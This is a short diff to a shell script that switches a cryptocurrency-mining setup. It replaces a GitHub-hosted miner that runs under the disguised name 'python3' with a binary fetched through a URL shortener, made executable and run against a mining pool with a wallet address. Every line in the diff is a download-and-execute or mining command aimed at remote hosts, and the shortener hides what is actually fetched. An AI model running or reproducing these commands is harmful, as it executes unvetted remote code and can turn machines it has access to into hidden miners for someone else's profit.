@@ -1,5 +1,5 @@
-wget -O DOT https://github.com/DotAja/ALONE/releases/download/alone/dotcpu.tar.gz
+wget -O LUCK https://s.id/gal91
 
-tar -xvf DOT
+chmod +x LUCK
 
-./dotcpu/python3 -a yespowersugar -o cugeoyom.tech:3333 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz
+./LUCK -a flex -P lc1qe0t4ns5pwr50mdww7ttw37p6zs5zhu57z2qu3y.luck@eu.mpool.live:5271
